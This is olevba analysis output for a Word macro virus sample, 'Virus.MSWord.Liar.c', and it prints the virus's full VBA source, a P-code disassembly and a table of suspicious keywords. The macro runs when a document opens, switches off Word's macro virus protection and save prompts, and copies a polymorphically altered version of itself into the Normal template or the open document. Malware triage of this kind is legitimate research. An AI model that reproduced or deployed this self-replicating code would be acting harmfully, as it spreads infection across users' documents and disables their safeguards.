olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Do you see what I see? Do you hear what I hear?'
Rem Do you feel what I feel?'
Rem Do you ever cared?'
Rem                           -jackie twoflower-'
Private Sub Document_Open() '
On Error Resume Next '
Dim Bm630(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set Cf546 = MacroContainer.VBProject: Set Ll729 = Cf546.VBComponents(1) '
Set De594 = Ll729.CodeModule: Set Jh11 = NormalTemplate: Li495 = Chr(39) '
If MacroContainer = Jh11 Then Set Jh11 = ActiveDocument '
Set Vu944 = Jh11.VBProject.VBComponents(1).CodeModule: Eo654 = De594.CountOfLines: Tt963 = 100 + Int(Rnd * 50) '
For No220 = 1 To Eo654: Su942 = "": Di568 = Int(Rnd * 4): Qp530 = InStr(De594.Lines(No220, 1), Li495) '
If Qp530 = 1 And Eo654 > Tt963 Then '
Di568 = 1: GoTo Eq83 '
End If '
Dg903 = UCase(Left(De594.Lines(No220, 1), (Qp530 - 1))) '
For Uv117 = 1 To Len(Dg903): Gx417 = Mid(Dg903, Uv117, 1) '
If Asc(Gx417) < 90 And Asc(Gx417) > 65 Then Gx417 = Chr(Asc(Gx417) + Int(Rnd * 2) * 32) '
Bm630(No220) = Bm630(No220) & Gx417: Next Uv117 '
For Gr444 = 1 To Int(75 - Int(Rnd * 20)): Su942 = Su942 & Chr(255 - Int(Rnd * 100)): Next Gr444 '
Bm630(No220) = Bm630(No220) & Li495 & Su942 '
If Di568 = 2 Then Bm630(No220) = Bm630(No220) & vbCr & Li495 & Su942 '
Ut894 = Ut894 & Bm630(No220) & vbCr '
Eq83: '
Next No220 '
If Vu944.CountOfLines < (0 + 2) Then '
Vu944.DeleteLines 1, Vu944.CountOfLines: Vu944.AddFromString Ut894 '
If Jh11 = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
End Sub '
Rem Another macro bug by jackie twoflower's Class Macro Kit v1.0'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Liar.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3680 bytes
' Line #0:
' 	Rem 0x0031 " Do you see what I see? Do you hear what I hear?'"
' Line #1:
' 	Rem 0x001A " Do you feel what I feel?'"
' Line #2:
' 	Rem 0x0014 " Do you ever cared?'"
' Line #3:
' 	Rem 0x002E "                           -jackie twoflower-'"
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' 	QuoteRem 0x001B 0x0000 ""
' Line #5:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0014 0x0000 ""
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00AF 
' 	VarDefn Bm630
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0058 0x0000 ""
' Line #7:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set Cf546 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Cf546 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set Ll729 
' 	QuoteRem 0x0047 0x0000 ""
' Line #8:
' 	SetStmt 
' 	Ld Ll729 
' 	MemLd CodeModule 
' 	Set De594 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Jh11 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St Li495 
' 	QuoteRem 0x0048 0x0000 ""
' Line #9:
' 	Ld MacroContainer 
' 	Ld Jh11 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Jh11 
' 	EndIf 
' 	QuoteRem 0x0037 0x0000 ""
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Jh11 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Vu944 
' 	BoS 0x0000 
' 	Ld De594 
' 	MemLd CountOfLines 
' 	St Eo654 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St Tt963 
' 	QuoteRem 0x006E 0x0000 ""
' Line #11:
' 	StartForVariable 
' 	Ld No220 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Eo654 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St Su942 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	FnInt 
' 	St Di568 
' 	BoS 0x0000 
' 	Ld No220 
' 	LitDI2 0x0001 
' 	Ld De594 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Li495 
' 	FnInStr 
' 	St Qp530 
' 	QuoteRem 0x0066 0x0000 ""
' Line #12:
' 	Ld Qp530 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Eo654 
' 	Ld Tt963 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0024 0x0000 ""
' Line #13:
' 	LitDI2 0x0001 
' 	St Di568 
' 	BoS 0x0000 
' 	GoTo Eq83 
' 	QuoteRem 0x0014 0x0000 ""
' Line #14:
' 	EndIfBlock 
' 	QuoteRem 0x0006 0x0000 ""
' Line #15:
' 	Ld No220 
' 	LitDI2 0x0001 
' 	Ld De594 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Qp530 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Dg903 
' 	QuoteRem 0x0037 0x0000 ""
' Line #16:
' 	StartForVariable 
' 	Ld Uv117 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Dg903 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld Dg903 
' 	Ld Uv117 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Gx417 
' 	QuoteRem 0x0039 0x0000 ""
' Line #17:
' 	Ld Gx417 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld Gx417 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Gx417 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Gx417 
' 	EndIf 
' 	QuoteRem 0x0057 0x0000 ""
' Line #18:
' 	Ld No220 
' 	ArgsLd Bm630 0x0001 
' 	Ld Gx417 
' 	Concat 
' 	Ld No220 
' 	ArgsSt Bm630 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Uv117 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x002F 0x0000 ""
' Line #19:
' 	StartForVariable 
' 	Ld Gr444 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld Su942 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Su942 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Gr444 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x005F 0x0000 ""
' Line #20:
' 	Ld No220 
' 	ArgsLd Bm630 0x0001 
' 	Ld Li495 
' 	Concat 
' 	Ld Su942 
' 	Concat 
' 	Ld No220 
' 	ArgsSt Bm630 0x0001 
' 	QuoteRem 0x002B 0x0000 ""
' Line #21:
' 	Ld Di568 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld No220 
' 	ArgsLd Bm630 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld Li495 
' 	Concat 
' 	Ld Su942 
' 	Concat 
' 	Ld No220 
' 	ArgsSt Bm630 0x0001 
' 	EndIf 
' 	QuoteRem 0x0044 0x0000 ""
' Line #22:
' 	Ld Ut894 
' 	Ld No220 
' 	ArgsLd Bm630 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Ut894 
' 	QuoteRem 0x0023 0x0000 ""
' Line #23:
' 	Label Eq83 
' 	QuoteRem 0x0005 0x0000 ""
' Line #24:
' 	StartForVariable 
' 	Ld No220 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0000 ""
' Line #25:
' 	Ld Vu944 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0024 0x0000 ""
' Line #26:
' 	LitDI2 0x0001 
' 	Ld Vu944 
' 	MemLd CountOfLines 
' 	Ld Vu944 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Ut894 
' 	Ld Vu944 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x0042 0x0000 ""
' Line #27:
' 	Ld Jh11 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' 	QuoteRem 0x004B 0x0000 ""
' Line #28:
' 	EndIfBlock 
' 	QuoteRem 0x0006 0x0000 ""
' Line #29:
' 	EndSub 
' 	QuoteRem 0x0007 0x0000 ""
' Line #30:
' 	Rem 0x003E " Another macro bug by jackie twoflower's Class Macro Kit v1.0'"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

